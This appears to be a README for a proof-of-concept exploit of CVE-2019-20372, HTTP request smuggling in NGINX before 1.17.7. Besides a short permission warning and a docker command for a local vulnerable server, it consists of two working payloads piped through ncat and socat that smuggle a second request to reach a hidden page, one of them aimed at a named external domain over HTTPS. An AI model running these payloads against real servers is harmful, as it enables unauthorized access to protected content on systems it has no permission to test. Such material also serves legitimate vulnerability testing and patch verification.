# nginx0-smuggler (CVE-2019-20372)

> [!NOTE]\
> Do not use this on an server you don't own or dont have permission to test on.

NGINX before 1.17.7, with certain error_page configurations, allows HTTP request smuggling, as demonstrated by the ability of an attacker to read unauthorized web pages in environments where NGINX is being fronted by a load balancer.

docker container to recreate an vuln server in the localhost:
```
docker run -it --rm -p 80:80 -v ./default.conf:/etc/nginx/conf.d/default.conf nginx:1.14.0
```
### payload for port 80 (HTTP)
```
cat <(printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET /_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n") - | ncat localhost 80
```

### payload for port 443 (HTTPS)
```
cat <(printf 'GET / HTTP/1.1\r\nHost: vigneshsb.fun\r\n\r\nGET /404 HTTP/1.1\r\nHost: localhost\r\n\r\n') - | socat - SSL:vigneshsb.fun:443
```
